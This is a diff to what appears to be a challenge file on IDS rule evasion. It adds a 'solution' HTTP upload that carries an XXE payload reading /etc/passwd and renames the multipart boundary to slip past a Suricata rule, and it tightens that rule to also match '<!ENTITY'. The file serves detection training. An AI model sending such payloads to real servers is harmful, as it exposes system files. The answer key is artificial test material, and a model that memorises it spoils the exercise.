@@ -35,9 +35,35 @@ base_request: |-
 
   ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Connection: keep-alive
+  Content-Length: 343
+  Content-Type: multipart/form-data; boundary=----a
+
+  ------a
+  Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
+  Content-Type: text/xml
+
+  <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE draconis [
+       <!ENTITY xxe SYSTEM "file:///etc/passwd">
+     ]>
+     <dragons>
+       <dragon>
+         <name>Smaug</name>
+         <proof>&xxe;</proof>
+       </dragon>
+     </dragons>
+
+  ------a--
+
+solution_note: Matching on WebKitFormBoundary
+
 rules:
 # Matching WebKitFormBoundary (free-form)
 - >
-  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.header; content: "WebKitFormBoundary"; sid:123456; rev:1;)
+  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.header; content: "WebKitFormBoundary"; http.request_body; content: "<!ENTITY"; sid:123456; rev:1;)
 
 expected_output: "root:"
